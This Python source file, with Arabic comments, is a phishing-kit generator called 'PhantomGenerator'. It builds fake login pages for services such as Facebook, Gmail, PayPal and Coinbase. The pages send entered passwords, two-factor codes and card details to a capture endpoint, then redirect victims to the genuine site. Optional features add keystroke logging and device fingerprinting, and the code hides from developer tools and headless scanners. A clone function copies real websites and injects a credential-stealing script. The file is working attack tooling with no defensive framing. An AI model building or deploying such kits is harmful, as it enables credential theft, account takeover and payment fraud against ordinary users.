#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import json
import base64
import random
import string
import uuid
import hashlib
from datetime import datetime
from typing import List, Dict, Optional
from jinja2 import Environment, BaseLoader

class PhantomGenerator:
    def __init__(self):
        self.env = Environment(loader=BaseLoader())
        
        # قوالب HTML لكل منصة
        self.templates = self._load_templates()
    
    def _load_templates(self) -> Dict:
        """تحميل قوالب HTML"""
        templates = {}
        
        # قالب عام قابل للتخصيص
        templates['generic'] = '''
<!DOCTYPE html>
<html lang="{{ lang }}">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{{ title }}</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: {{ bg_color }};
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .container {
            max-width: 400px;
            width: 100%;
            padding: 20px;
        }
        .logo {
            text-align: center;
            margin-bottom: 30px;
            font-size: 48px;
        }
        .login-box {
            background: white;
            border: 1px solid #dbdbdb;
            border-radius: 8px;
            padding: 40px;
            margin-bottom: 20px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        h1 {
            font-size: 28px;
            font-weight: 600;
            text-align: center;
            margin-bottom: 30px;
            color: #262626;
        }
        .input-group {
            margin-bottom: 15px;
        }
        input {
            width: 100%;
            padding: 12px 15px;
            border: 1px solid #dbdbdb;
            border-radius: 4px;
            font-size: 14px;
            background: #fafafa;
            transition: border-color 0.3s;
        }
        input:focus {
            outline: none;
            border-color: {{ primary_color }};
            background: white;
        }
        button {
            width: 100%;
            padding: 12px;
            background: {{ primary_color }};
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 10px;
            transition: opacity 0.3s;
        }
        button:hover { opacity: 0.9; }
        .divider {
            display: flex;
            align-items: center;
            margin: 20px 0;
        }
        .divider::before, .divider::after {
            content: '';
            flex: 1;
            height: 1px;
            background: #dbdbdb;
        }
        .divider span {
            padding: 0 15px;
            color: #8e8e8e;
            font-size: 12px;
            font-weight: 600;
        }
        .alt-login {
            text-align: center;
            color: {{ primary_color }};
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 15px;
        }
        .forgot {
            text-align: center;
            margin-top: 20px;
        }
        .forgot a {
            color: #00376b;
            font-size: 12px;
            text-decoration: none;
        }
        .signup {
            background: white;
            border: 1px solid #dbdbdb;
            border-radius: 8px;
            padding: 20px;
            text-align: center;
            font-size: 14px;
        }
        .signup a {
            color: {{ primary_color }};
            font-weight: 600;
            text-decoration: none;
        }
        .footer {
            text-align: center;
            margin-top: 40px;
            color: #8e8e8e;
            font-size: 12px;
        }
        .loading {
            display: none;
            text-align: center;
            padding: 20px;
        }
        .spinner {
            border: 3px solid #f3f3f3;
            border-top: 3px solid {{ primary_color }};
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .2fa-box { display: none; }
        .error-msg {
            color: #ed4956;
            font-size: 14px;
            text-align: center;
            margin-top: 10px;
            display: none;
        }
        @media (max-width: 480px) {
            .container { padding: 10px; }
            .login-box { padding: 30px 20px; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">{{ icon }}</div>
        
        <div class="login-box" id="main-box">
            <h1>{{ title }}</h1>
            
            <form id="login-form">
                {% for field in fields %}
                <div class="input-group">
                    <input 
                        type="{{ field.type }}"
                        name="{{ field.name }}"
                        id="{{ field.name }}"
                        placeholder="{{ field.placeholder }}"
                        {% if field.required %}required{% endif %}
                        autocomplete="off"
                        {% if field.pattern %}pattern="{{ field.pattern }}"{% endif %}
                    >
                </div>
                {% endfor %}
                
                <button type="submit">{{ submit_text }}</button>
                
                <div class="error-msg" id="error-msg">
                    Incorrect password. Please try again.
                </div>
                
                {% if show_social_login %}
                <div class="divider"><span>OR</span></div>
                <div class="alt-login">Continue with {{ alt_provider }}</div>
                {% endif %}
                
                <div class="forgot">
                    <a href="#">Forgot password?</a>
                </div>
            </form>
            
            <div class="loading" id="loading">
                <div class="spinner"></div>
                <p style="margin-top: 15px; color: #8e8e8e;">{{ loading_text }}</p>
            </div>
        </div>
        
        {% if enable_2fa %}
        <div class="login-box" id="2fa-box" style="display: none;">
            <h1>Two-Factor Authentication</h1>
            <p style="text-align: center; color: #8e8e8e; margin-bottom: 20px;">
                Enter the 6-digit code sent to your device
            </p>
            <form id="2fa-form">
                <div class="input-group">
                    <input 
                        type="text" 
                        name="2fa_code" 
                        id="2fa_code" 
                        placeholder="000000" 
                        maxlength="6" 
                        pattern="[0-9]{6}"
                        required
                        style="text-align: center; font-size: 24px; letter-spacing: 10px;"
                    >
                </div>
                <button type="submit">Verify</button>
            </form>
        </div>
        {% endif %}
        
        {% if enable_card %}
        <div class="login-box" id="card-box" style="display: none;">
            <h1>Payment Information</h1>
            <p style="text-align: center; color: #8e8e8e; margin-bottom: 20px;">
                Please verify your payment details
            </p>
            <form id="card-form">
                <div class="input-group">
                    <input type="text" name="card_number" id="card_number" 
                           placeholder="Card Number" maxlength="19" required>
                </div>
                <div class="input-group" style="display: flex; gap: 10px;">
                    <input type="text" name="expiry" id="expiry" 
                           placeholder="MM/YY" maxlength="5" required style="flex: 1;">
                    <input type="text" name="cvv" id="cvv" 
                           placeholder="CVV" maxlength="4" required style="flex: 1;">
                </div>
                <div class="input-group">
                    <input type="text" name="card_name" id="card_name" 
                           placeholder="Name on Card" required>
                </div>
                <button type="submit">Verify Payment</button>
            </form>
        </div>
        {% endif %}
        
        <div class="signup">
            Don't have an account? <a href="#">Sign up</a>
        </div>
        
        <div class="footer">
            <p>© 2024 {{ title }}. All rights reserved.</p>
            <p style="margin-top: 10px;">
                <a href="#" style="color: #8e8e8e; margin: 0 10px;">Privacy</a>
                <a href="#" style="color: #8e8e8e; margin: 0 10px;">Terms</a>
                <a href="#" style="color: #8e8e8e; margin: 0 10px;">Help</a>
            </p>
        </div>
    </div>
    
    <script>
        // Campaign Configuration
        const CAMPAIGN_ID = '{{ campaign_id }}';
        const CAPTURE_URL = '/api/capture/' + CAMPAIGN_ID;
        const PREVIEW_MODE = {{ preview_mode }};
        
        // Generate Session ID
        const SESSION_ID = Math.random().toString(36).substring(2) + Date.now().toString(36);
        
        // Session Data
        const sessionData = {
            session_id: SESSION_ID,
            user_agent: navigator.userAgent,
            language: navigator.language,
            platform: navigator.platform,
            screen: {
                width: screen.width,
                height: screen.height,
                colorDepth: screen.colorDepth,
                availWidth: screen.availWidth,
                availHeight: screen.availHeight
            },
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            timezone_offset: new Date().getTimezoneOffset(),
            referrer: document.referrer || 'direct',
            url: window.location.href,
            plugins: Array.from(navigator.plugins).map(p => p.name),
            cookies_enabled: navigator.cookieEnabled,
            do_not_track: navigator.doNotTrack,
            hardware_concurrency: navigator.hardwareConcurrency,
            device_memory: navigator.deviceMemory
        };
        
        // Capture Data Function
        async function captureData(data) {
            if (PREVIEW_MODE) {
                console.log('[PREVIEW] Would capture:', data);
                return;
            }
            
            try {
                const response = await fetch(CAPTURE_URL, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        ...sessionData,
                        ...data
                    })
                });
                return await response.json();
            } catch (e) {
                console.error('Capture failed:', e);
                // Store locally if failed
                const stored = JSON.parse(localStorage.getItem('phantom_queue') || '[]');
                stored.push({...sessionData, ...data, queued_at: Date.now()});
                localStorage.setItem('phantom_queue', JSON.stringify(stored));
            }
        }
        
        // Send initial pageview
        captureData({ type: 'pageview' });
        
        // Login Form Handler
        document.getElementById('login-form').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            // Show loading
            document.getElementById('loading').style.display = 'block';
            this.style.display = 'none';
            
            // Collect data
            const formData = new FormData(this);
            const credentials = {};
            for (let [key, value] of formData.entries()) {
                credentials[key] = value;
            }
            
            // Send credentials
            await captureData({
                type: 'credentials',
                data: credentials
            });
            
            {% if enable_2fa %}
            // Show 2FA
            setTimeout(() => {
                document.getElementById('loading').style.display = 'none';
                document.getElementById('main-box').style.display = 'none';
                document.getElementById('2fa-box').style.display = 'block';
            }, 1500);
            {% elif enable_card %}
            // Show Card Form
            setTimeout(() => {
                document.getElementById('loading').style.display = 'none';
                document.getElementById('main-box').style.display = 'none';
                document.getElementById('card-box').style.display = 'block';
            }, 1500);
            {% else %}
            // Redirect
            setTimeout(() => {
                window.location.href = '{{ redirect_url }}';
            }, 2000);
            {% endif %}
        });
        
        {% if enable_2fa %}
        // 2FA Form Handler
        document.getElementById('2fa-form').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const code = document.getElementById('2fa_code').value;
            
            await captureData({
                type: '2fa',
                data: { code: code }
            });
            
            {% if enable_card %}
            setTimeout(() => {
                document.getElementById('2fa-box').style.display = 'none';
                document.getElementById('card-box').style.display = 'block';
            }, 1000);
            {% else %}
            setTimeout(() => {
                window.location.href = '{{ redirect_url }}';
            }, 1500);
            {% endif %}
        });
        {% endif %}
        
        {% if enable_card %}
        // Card Form Handler
        document.getElementById('card-form').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const formData = new FormData(this);
            const cardData = {};
            for (let [key, value] of formData.entries()) {
                cardData[key] = value;
            }
            
            await captureData({
                type: 'card',
                data: cardData
            });
            
            setTimeout(() => {
                window.location.href = '{{ redirect_url }}';
            }, 1500);
        });
        
        // Card Number Formatting
        document.getElementById('card_number').addEventListener('input', function(e) {
            let value = e.target.value.replace(/\\D/g, '');
            if (value.length > 0) {
                e.target.value = value.match(/.{1,4}/g).join(' ');
            }
        });
        
        // Expiry Formatting
        document.getElementById('expiry').addEventListener('input', function(e) {
            let value = e.target.value.replace(/\\D/g, '');
            if (value.length >= 2) {
                value = value.substring(0, 2) + '/' + value.substring(2, 4);
            }
            e.target.value = value;
        });
        {% endif %}
        
        {% if enable_keylogger %}
        // Keylogger
        let keystrokeBuffer = [];
        let lastFlush = Date.now();
        
        document.addEventListener('keypress', function(e) {
            if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
                keystrokeBuffer.push({
                    field: e.target.name || e.target.id,
                    key: e.key,
                    code: e.code,
                    timestamp: Date.now()
                });
                
                // Flush every 5 keystrokes or 10 seconds
                if (keystrokeBuffer.length >= 5 || Date.now() - lastFlush > 10000) {
                    captureData({
                        type: 'keystrokes',
                        data: [...keystrokeBuffer]
                    });
                    keystrokeBuffer = [];
                    lastFlush = Date.now();
                }
            }
        });
        
        // Flush on page leave
        window.addEventListener('beforeunload', function() {
            if (keystrokeBuffer.length > 0) {
                navigator.sendBeacon(CAPTURE_URL, JSON.stringify({
                    ...sessionData,
                    type: 'keystrokes',
                    data: keystrokeBuffer
                }));
            }
        });
        {% endif %}
        
        // Anti-Debug Protection
        let devtools = false;
        setInterval(() => {
            const threshold = 200;
            if (window.outerHeight - window.innerHeight > threshold || 
                window.outerWidth - window.innerWidth > threshold) {
                if (!devtools) {
                    devtools = true;
                    document.body.innerHTML = '<div style="text-align:center;margin-top:100px;"><h1>404 Not Found</h1><p>The requested URL was not found on this server.</p></div>';
                    console.clear();
                }
            }
        }, 500);
        
        // Detect Headless Browsers
        if (navigator.webdriver || 
            /HeadlessChrome/.test(navigator.userAgent) ||
            window.callPhantom || 
            window._phantom || 
            window.__nightmare ||
            window.__phantomas) {
            window.location.href = 'about:blank';
        }
        
        // Prevent Copy/Paste in sensitive fields
        document.querySelectorAll('input[type="password"]').forEach(input => {
            input.addEventListener('copy', e => e.preventDefault());
            input.addEventListener('paste', e => e.preventDefault());
            input.addEventListener('cut', e => e.preventDefault());
        });
        
        // Process queued data
        async function processQueue() {
            const queued = JSON.parse(localStorage.getItem('phantom_queue') || '[]');
            if (queued.length > 0) {
                for (const item of queued) {
                    try {
                        await fetch(CAPTURE_URL, {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify(item)
                        });
                    } catch (e) {}
                }
                localStorage.removeItem('phantom_queue');
            }
        }
        
        // Process queue on load
        processQueue();
        
        // Heartbeat every 30 seconds
        setInterval(() => {
            captureData({ type: 'heartbeat' });
        }, 30000);
    </script>
</body>
</html>
        '''
        
        return templates
    
    def generate_campaign(self, platform: str, campaign_name: str,
                         base_url: str, features: List[str] = None,
                         preview: bool = False) -> Dict:
        """توليد حملة صيد كاملة"""
        
        from config import config
        
        if platform not in config.PLATFORMS:
            raise ValueError(f"Platform {platform} not supported")
        
        features = features or ['credentials']
        campaign_id = str(uuid.uuid4())[:12]
        
        # إنشاء رابط فريد
        campaign_url = f"{base_url}/c/{campaign_id}"
        preview_url = f"{base_url}/preview/{campaign_id}"
        
        platform_info = config.PLATFORMS[platform]
        
        # تحديد الحقول حسب المنصة
        fields = self._get_fields_for_platform(platform, features)
        
        # توليد HTML
        template = self.env.from_string(self.templates['generic'])
        html_content = template.render(
            title=platform_info['name'],
            icon=platform_info['icon'],
            primary_color=platform_info['color'],
            bg_color='#fafafa',
            lang='en',
            fields=fields,
            submit_text='Log In',
            loading_text='Verifying...',
            show_social_login=platform in ['facebook', 'instagram'],
            alt_provider='Facebook',
            enable_2fa='2fa' in features,
            enable_card='card' in features,
            enable_keylogger='keylogger' in features,
            redirect_url=self._get_redirect_url(platform),
            campaign_id=campaign_id,
            preview_mode='true' if preview else 'false'
        )
        
        return {
            'campaign_id': campaign_id,
            'name': campaign_name,
            'platform': platform,
            'url': campaign_url,
            'preview_url': preview_url,
            'html': html_content,
            'features': features,
            'created_at': datetime.now().isoformat()
        }
    
    def _get_fields_for_platform(self, platform: str, features: List[str]) -> List[Dict]:
        """تحديد حقول الإدخال حسب المنصة"""
        
        # حقول البريد الإلكتروني الشائعة
        email_fields = [
            {'name': 'email', 'type': 'email', 'placeholder': 'Email or Phone', 'required': True},
            {'name': 'password', 'type': 'password', 'placeholder': 'Password', 'required': True}
        ]
        
        # حقول اسم المستخدم الشائعة
        username_fields = [
            {'name': 'username', 'type': 'text', 'placeholder': 'Username', 'required': True},
            {'name': 'password', 'type': 'password', 'placeholder': 'Password', 'required': True}
        ]
        
        # حقول الهاتف
        phone_fields = [
            {'name': 'phone', 'type': 'tel', 'placeholder': 'Phone Number', 'required': True},
            {'name': 'password', 'type': 'password', 'placeholder': 'Password', 'required': True}
        ]
        
        # تحديد الحقول حسب المنصة
        if platform in ['facebook', 'gmail', 'google', 'outlook', 'yahoo', 
                       'paypal', 'amazon', 'netflix', 'spotify', 'twitter']:
            return email_fields
        
        elif platform in ['instagram', 'tiktok', 'snapchat', 'reddit', 'twitch',
                         'steam', 'epicgames', 'roblox', 'discord']:
            return username_fields
        
        elif platform in ['whatsapp', 'telegram', 'signal', 'wechat', 'line']:
            return phone_fields
        
        elif platform == 'linkedin':
            return [
                {'name': 'email', 'type': 'email', 'placeholder': 'Email', 'required': True},
                {'name': 'password', 'type': 'password', 'placeholder': 'Password', 'required': True}
            ]
        
        elif platform in ['coinbase', 'binance', 'kraken']:
            return [
                {'name': 'email', 'type': 'email', 'placeholder': 'Email', 'required': True},
                {'name': 'password', 'type': 'password', 'placeholder': 'Password', 'required': True},
                {'name': '2fa_backup', 'type': 'text', 'placeholder': '2FA Backup Code (optional)', 'required': False}
            ]
        
        else:
            return email_fields
    
    def _get_redirect_url(self, platform: str) -> str:
        """رابط إعادة التوجيه بعد التقاط"""
        redirects = {
            'facebook': 'https://www.facebook.com',
            'instagram': 'https://www.instagram.com',
            'twitter': 'https://twitter.com',
            'google': 'https://www.google.com',
            'gmail': 'https://mail.google.com',
            'paypal': 'https://www.paypal.com',
            'amazon': 'https://www.amazon.com',
            'netflix': 'https://www.netflix.com',
            'spotify': 'https://www.spotify.com',
            'steam': 'https://store.steampowered.com',
            'default': 'https://www.google.com'
        }
        return redirects.get(platform, redirects['default'])
    
    def clone_website(self, url: str, campaign_id: str) -> Dict:
        """استنساخ موقع من رابط"""
        import requests
        from bs4 import BeautifulSoup
        from urllib.parse import urljoin, urlparse
        
        try:
            # تحميل الصفحة
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
            response = requests.get(url, headers=headers, timeout=30)
            response.raise_for_status()
            
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # تعديل النماذج
            for form in soup.find_all('form'):
                form['action'] = f'/api/capture/{campaign_id}'
                form['method'] = 'POST'
                
                # إضافة حقل مخفي للجلسة
                hidden = soup.new_tag('input')
                hidden['type'] = 'hidden'
                hidden['name'] = 'session_id'
                hidden['id'] = 'phantom_session'
                form.append(hidden)
            
            # حقن سكربت التتبع
            script = soup.new_tag('script')
            script.string = f'''
                const CAMPAIGN_ID = "{campaign_id}";
                const SESSION_ID = Math.random().toString(36).substring(2) + Date.now().toString(36);
                document.getElementById('phantom_session').value = SESSION_ID;
                
                document.querySelectorAll('form').forEach(form => {{
                    form.addEventListener('submit', async function(e) {{
                        e.preventDefault();
                        const formData = new FormData(form);
                        const data = {{}};
                        for (let [k, v] of formData.entries()) data[k] = v;
                        
                        await fetch('/api/capture/' + CAMPAIGN_ID, {{
                            method: 'POST',
                            headers: {{'Content-Type': 'application/json'}},
                            body: JSON.stringify({{
                                session_id: SESSION_ID,
                                type: 'credentials',
                                data: data,
                                user_agent: navigator.userAgent,
                                url: window.location.href
                            }})
                        }});
                        
                        window.location.href = '{url}';
                    }});
                }});
            '''
            soup.body.append(script)
            
            return {
                'success': True,
                'html': str(soup),
                'title': soup.title.string if soup.title else 'Cloned Site'
            }
            
        except Exception as e:
            return {
                'success': False,
                'error': str(e)
            }

# كائن المولد العام
generator = PhantomGenerator()
